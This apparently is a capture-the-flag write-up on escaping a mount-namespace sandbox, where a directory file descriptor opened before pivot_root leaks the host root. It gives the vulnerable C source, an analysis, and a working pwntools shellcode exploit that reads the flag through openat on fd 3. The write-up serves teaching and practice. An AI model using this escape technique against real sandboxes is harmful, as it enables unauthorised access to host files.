---
title: "Mount Namespace Escape via FD Leak"
description: "Escaping a mount namespace sandbox by leveraging a file descriptor to the host root directory leaked before the sandbox was initialized."
date: "2026-01-04"
order: 17
draft: false
---

# Mount Namespace Escape via FD Leak

## Challenge Source Code

```c
#define _GNU_SOURCE 1
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  assert(argc > 1);

  for (int i = 3; i < 10000; i++)
    close(i);

  // Leaking a file descriptor before the sandbox
  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);

  char new_root[] = "/tmp/jail-XXXXXX";
  char old_root[1024];

  assert(geteuid() == 0);
  assert(unshare(CLONE_NEWNS) != -1);
  assert(mkdtemp(new_root) != NULL);
  assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);
  assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

  snprintf(old_root, sizeof(old_root), "%s/old", new_root);
  assert(mkdir(old_root, 0777) != -1);
  assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

  // Hardening: unmount and remove old root references
  assert(umount2("/old", MNT_DETACH) != -1);
  assert(rmdir("/old") != -1);

  setresuid(0, 0, 0);
  assert(chdir("/") == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  void *shellcode =
      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANON, 0, 0);
  read(0, shellcode, 0x1000);
  ((void (*)())shellcode)();
}
```

## Vulnerability Analysis

This challenge attempts to fully isolate the process by using a mount namespace, `pivot_root`, and then explicitly unmounting the old root filesystem (`/old`). This removes any obvious path-based escapes.

However, the program opens a file path provided in `argv[1]` **before** it performs any of these sandbox operations. The resulting file descriptor (usually FD 3) remains open and valid across the `unshare` and `pivot_root` calls.

If we pass `/` as the first argument, the process will hold an open file descriptor pointing to the host's real root directory. Even though the filesystem view changes, the handle to the original directory remains functional.

## Exploitation Plan

1.  **Leak the Root FD:** Run the binary with `/` as the argument to open the host's root directory. Since FDs 3-10000 were closed before this `open()` call, the new descriptor will be FD 3.
2.  **Bypass Namespace:** Use the `openat` syscall within the shellcode. By providing FD 3 as the base directory, we can open files relative to the host's root, bypassing the mount namespace isolation entirely.
3.  **Read Flag:** Use `openat(3, "flag", ...)` followed by `read` and `write` to exfiltrate the flag.

## Exploit Script

The following script uses `pwntools` and `shellcraft` to generate assembly that leverages the leaked root file descriptor to access the flag on the host system.

```python
from pwn import *

context.arch = "amd64"

# Target binary
elf = ELF("./challenge", checksec=False)

# The binary opens argv[1] before the sandbox.
# We pass "/" to get a file descriptor for the host root.
# FDs 3-10000 are closed just before open(), so fd 3 will be the host root.
p = process([elf.path, "/"])

# Shellcode to:
# 1. openat(3, "flag", O_RDONLY)
# 2. read(rax, rsp, 100)
# 3. write(1, rsp, 100)
sc = shellcraft.openat(3, "flag", 0)
sc += shellcraft.read("rax", "rsp", 100)
sc += shellcraft.write(1, "rsp", 100)
sc += shellcraft.exit(0)

shellcode = asm(sc)

# Send the shellcode
p.send(shellcode)

# Receive and print the flag
print(p.recvall(timeout=2).decode())
p.close()
```
